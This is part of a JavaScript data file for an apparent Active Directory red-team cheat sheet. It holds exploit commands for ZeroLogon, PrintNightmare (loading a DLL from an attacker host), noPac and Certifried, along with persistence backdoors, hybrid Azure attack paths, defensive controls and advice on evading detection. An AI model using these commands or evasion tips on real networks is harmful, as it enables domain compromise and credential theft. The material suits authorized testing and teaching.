                    'Survives domain admin password resets, krbtgt rotation'
                ]
            },
            {
                title: 'Custom SSP / SID History',
                type: 'list',
                items: [
                    'Custom SSP: Register malicious DLL as Security Support Provider — captures all plaintext passwords at logon',
                    'Mimikatz: misc::memssp — logs creds to C:\\Windows\\System32\\mimilsa.log',
                    'SID History: Add Enterprise Admin SID (S-1-5-21-...-519) to a normal user\'s sIDHistory',
                    'User appears normal but carries EA privileges in every Kerberos ticket',
                    'Detection: Monitor sIDHistory changes (Event 4765), audit LSA registry keys'
                ]
            },
            {
                title: 'AdminSDHolder & GPO Backdoors',
                type: 'list',
                items: [
                    'AdminSDHolder: Modify ACL → SDProp copies it to all protected objects every 60min',
                    'Even if SOC removes your ACE from Domain Admins, it gets automatically restored',
                    'GPO Backdoor: Add scheduled task / startup script via GPO — executes on every machine in OU',
                    'Machine Account: Create machine accounts (default quota: 10) for RBCD-based access',
                    'ADIDNS Time Bomb: Pre-register DNS records for future hosts → MITM on domain join'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 19: Notable AD CVEs
    // ============================================================
    {
        id: 'ad-cves',
        title: '// Notable AD CVEs',
        phase: 'privesc',
        intro: 'The vulnerabilities that changed AD security forever. Encountered in labs, CTFs, and real engagements.',
        subsections: [
            {
                title: 'ZeroLogon (CVE-2020-1472)',
                type: 'commands',
                commands: [
                    { tool: 'zerologon', cmd: 'zerologon_tester.py DC_NETBIOS {{TARGET_DC}}', desc: 'Test for ZeroLogon vulnerability' },
                    { tool: 'zerologon', cmd: 'cve-2020-1472-exploit.py DC_NETBIOS {{TARGET_DC}}', desc: 'Exploit — sets DC machine password to empty' }
                ],
                notes: ['WARNING: Breaks AD replication — must restore machine password immediately', 'Impact: Instant Domain Admin from unauthenticated network position']
            },
            {
                title: 'PrintNightmare (CVE-2021-1675/34527)',
                type: 'commands',
                commands: [
                    { tool: 'PrintNightmare', cmd: 'CVE-2021-1675.py {{ATTACKER_IP}} {{TARGET_DC}} -u {{USERNAME}} -p {{PASSWORD}} \'\\\\{{ATTACKER_IP}}\\share\\evil.dll\'', desc: 'RCE as SYSTEM via Print Spooler — host DLL on SMB share' }
                ],
                notes: ['On DCs: SYSTEM = Domain Admin equivalent', 'Mitigation: Disable Print Spooler on DCs and servers']
            },
            {
                title: 'noPac / SamAccountName Spoofing',
                type: 'commands',
                commands: [
                    { tool: 'noPac', cmd: 'noPac.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}} -dc-host DC_HOSTNAME --impersonate Administrator -dump', desc: 'Any domain user → Domain Admin via SAMAccountName spoofing' }
                ],
                notes: ['Chain: Create machine → rename to DC name → request TGT → rename back → KDC issues TGS as DC$']
            },
            {
                title: 'Certifried (CVE-2022-26923)',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy account create -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -dc-ip {{TARGET_DC}} -user \'EVIL$\' -dns {{TARGET_DC}}', desc: 'Create machine account with DC\'s dNSHostName' },
                    { tool: 'certipy', cmd: 'certipy req -u \'EVIL$\' -p \'Passw0rd\' -ca {{CA_NAME}} -template Machine -dc-ip {{TARGET_DC}}', desc: 'Request machine cert → authenticates as DC → DCSync' }
                ]
            },
            {
                title: 'CVE-2025-24071 — NTLM Hash Leak via .library-ms',
                type: 'list',
                items: [
                    'Opening a ZIP/RAR containing .library-ms file triggers SMB auth to attacker',
                    'Windows Explorer automatically parses .library-ms upon extraction — no user interaction beyond extraction',
                    'Leaked: NTLMv2 hashes — crack with hashcat mode 5600 or relay',
                    'Attack scenario: Email ZIP → user extracts → hash captured by Responder'
                ]
            },
            {
                title: 'CVE-2025-33073 — NTLM Relay Vulnerability',
                type: 'list',
                items: [
                    'Enables relay of NTLM authentication to gain unauthorized access',
                    'Chain with coercion techniques to target high-value accounts',
                    'Relay targets: LDAP, SMB, HTTP endpoints without signing/binding',
                    'Mitigation: Enforce LDAP signing, channel binding, SMB signing, EPA'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 20: Azure AD / Entra ID Hybrid
    // ============================================================
    {
        id: 'azure-hybrid',
        title: '// Azure AD / Entra ID Hybrid Attacks',
        phase: 'lateral',
        intro: 'Most enterprises run hybrid AD. Cloud-to-on-prem and on-prem-to-cloud attack paths are increasingly critical.',
        subsections: [
            {
                title: 'Azure AD Connect',
                type: 'list',
                items: [
                    'Syncs on-prem AD objects to Azure AD — runs with high privileges in both',
                    'Password Hash Sync (PHS): Hashes synced to Azure — MSOL account has DCSync-equivalent rights',
                    'Extract creds: AADInternals Get-AADIntSyncCredentials — dumps MSOL service account',
                    'Pass-Through Auth (PTA): Auth agent can be backdoored to accept any password',
                    'Federation (ADFS): Steal token-signing certificate → forge SAML tokens (Golden SAML)',
                    'Impact: MSOL account can DCSync → compromise on-prem from cloud, or vice versa'
                ]
            },
            {
                title: 'PRT & Token Theft',
                type: 'list',
                items: [
                    'PRT: SSO token for Azure AD — grants access to all cloud resources without re-auth',
                    'Software PRTs can be extracted from LSASS',
                    'ROADtools: Enumerate Azure AD, extract tokens, map permissions',
                    'Seamless SSO: AZUREADSSOACC$ computer account hash → forge Silver Tickets for cloud auth',
                    'Device code phishing: Trick user into entering device code → steal tokens'
                ]
            },
            {
                title: 'Cloud → On-Prem Paths',
                type: 'list',
                items: [
                    'Global Admin → Reset MSOL password → DCSync on-prem',
                    'Intune admin: Push scripts/apps to hybrid-joined devices → code execution',
                    'Password writeback: Cloud admin can reset on-prem passwords',
                    'ADFS token forgery: Golden SAML — forge auth tokens for any federated user'
                ]
            },
            {
                title: 'On-Prem → Cloud Paths',
                type: 'list',
                items: [
                    'MSOL account: DCSync hash → authenticate to Azure AD',
                    'Seamless SSO: Dump AZUREADSSOACC$ hash → forge Kerberos tickets for Azure AD auth',
                    'Synced admin accounts: On-prem DA with same UPN as cloud GA → same password/hash',
                    'Key takeaway: Hybrid = both environments share trust. Owning one often means owning both.'
                ]
            },
            {
                title: 'Conditional Access Bypass via Cross-Tenant ROPC',
                type: 'list',
                items: [
                    'Authenticate through a different tenant\'s ROPC endpoint → bypass Conditional Access',
                    'Bypasses MFA, device compliance, location-based policies',
                    'Mitigation: Disable ROPC grant, enforce cross-tenant access policies, use CAE'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 21: Protected Users & Defensive Controls
    // ============================================================
    {
        id: 'defenses',
        title: '// Protected Users & Defensive Controls',
        phase: 'defense',
        intro: 'What actually blocks AD attacks. Understanding defenses helps identify what\'s deployed (and what\'s not) during engagements.',
        subsections: [
            {
                title: 'Protected Users Group',
                type: 'commands',
                commands: [
                    { tool: 'Windows', cmd: 'net group "Protected Users" /domain', desc: 'Check Protected Users group membership' }
                ],
                notes: [
                    'No NTLM — blocks PtH, NTLM relay, Responder capture',
                    'Kerberos AES only — no RC4/DES, slows Kerberoasting',
                    'No delegation — TGTs non-forwardable',
                    'No DCC2 cached creds on workstations',
                    'TGT lifetime reduced to 4 hours',
                    'Limitation: Breaks apps requiring NTLM or delegation'
                ]
            },
            {
                title: 'Credential Guard',
                type: 'commands',
                commands: [
                    { tool: 'PowerShell', cmd: 'Get-ComputerInfo -Property DeviceGuard*', desc: 'Check if Credential Guard is enabled' }
                ],
                notes: [
                    'Uses VBS to isolate LSASS secrets in secure enclave (LSAIso.exe)',
                    'Blocks: Mimikatz sekurlsa, PtH from memory, DPAPI master keys',
                    'Does NOT block: Kerberoasting, AS-REP, DCSync, NTDS.dit offline',
                    'Requirements: UEFI Secure Boot, TPM 2.0, Enterprise edition'
                ]
            },
            {
                title: 'AES-Only Kerberos & LDAP Signing',
                type: 'list',
                items: [
                    'AES-only: Disable RC4 → Kerberoasted hashes become mode 19700 (much slower)',
                    'LDAP Signing: Require → blocks NTLM relay to LDAP',
                    'LDAP Channel Binding: Require → blocks relay to LDAPS',
                    'SMB Signing: Require on all hosts → blocks SMB-to-SMB relay',
                    'Extended Protection for Auth: Blocks relay to HTTP/HTTPS endpoints'
                ]
            },
            {
                title: 'Tiered Administration Model',
                type: 'list',
                items: [
                    'Tier 0: Domain Controllers, AD admins — never log into lower-tier machines',
                    'Tier 1: Servers, applications — separate admin accounts',
                    'Tier 2: Workstations, end users — local admin only',
                    'PAW: Privileged Access Workstation — hardened for Tier 0 admin',
                    'Reality: Most orgs violate tiering — DA creds on workstations is #1 path to domain compromise'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 22: OPSEC Considerations
    // ============================================================
    {
        id: 'opsec',
        title: '// OPSEC Considerations',
        phase: 'opsec',
        intro: 'What\'s loud, what\'s quiet, and what will get you caught. Essential for red teamers.',
        subsections: [
            {
                title: 'Attack Noise Level Guide',
                type: 'diagram',
                tool: 'REFERENCE',
                content: `TECHNIQUE                      NOISE     WHY
──────────────────────────────────────────────────────────
QUIET (hard to detect)
  BloodHound collection          LOW     Standard LDAP queries
  Kerberoasting                  LOW     Legitimate TGS requests
  AS-REP Roasting                LOW     Normal-looking AS-REQ
  LDAP enumeration               LOW     Standard directory queries
  Silver Ticket                  LOW     Never touches DC
  RBCD setup                   LOW-MED   Attribute mod often unmonitored

MODERATE (detectable)
  Password Spray               MEDIUM    Failed logons (4625/4771)
  DCSync                       MEDIUM    Event 4662 from non-DC
  NTLM Relay                   MEDIUM    Auth source/dest mismatch
  Coercion                     MEDIUM    Unusual RPC calls to DC
  ACL modifications            MEDIUM    Event 5136

LOUD (easily detected)
  Mimikatz / lsassy             HIGH     LSASS access, known sigs
  PsExec                        HIGH     Service creation (7045)
  ZeroLogon                     HIGH     Breaks replication
  Responder (broadcast)         HIGH     LLMNR responses from unknown
  Golden Ticket               MED-HIGH   TGT with no AS-REQ
  Mass NTDS dump                HIGH     VSS shadow + large data exfil`
            },
            {
                title: 'Staying Quiet',
                type: 'list',
                items: [
                    'Use Kerberos over NTLM: NTLM from Linux tools stands out',
                    'Slow and low spraying: 1 attempt per user per 30+ minutes, Kerberos pre-auth',
                    'BloodHound: Use --collectionmethod DCOnly to avoid touching endpoints',
                    'Avoid PsExec: Use WMIExec or evil-winrm (legitimate WinRM)',
                    'Living off the land: Built-in tools (PowerShell, net.exe, nltest) over external binaries'
                ]
            },
            {
                title: 'Preferred Alternatives',
                type: 'list',
                items: [
                    'Instead of PsExec: wmiexec (no service), atexec (sched task), evil-winrm',
                    'Instead of Mimikatz/lsassy: secretsdump.py remotely, or procdump → offline pypykatz',
                    'Instead of SharpHound: bloodhound-python (DCOnly), manual LDAP with ldeep',
                    'Instead of Responder broadcast: Targeted coercion (PetitPotam to specific host)',
                    'Instead of Golden Ticket: Diamond/Sapphire Ticket (has legitimate AS-REQ)',
                    'Instead of mass NTDS dump: Targeted DCSync for specific accounts only'
                ]
            },
            {
                title: 'LDAP OPSEC',
                type: 'list',
                items: [
                    'Hex-patch objectGUID queries: Tools use (objectGUID=*) — patch to avoid signature detection',
                    'Targeted LDAP filters: Only query what you need, avoid wholesale subtree enumeration',
                    'BOFHound: BloodHound-compatible collection via BOF LDAP queries — smaller footprint',
                    'RustHound-CE: Custom LDAP filters to mask collection patterns',
                    'Query spacing: Spread queries over time to blend with normal traffic'
                ]
            }
        ]
    }

]); // End of Part 2
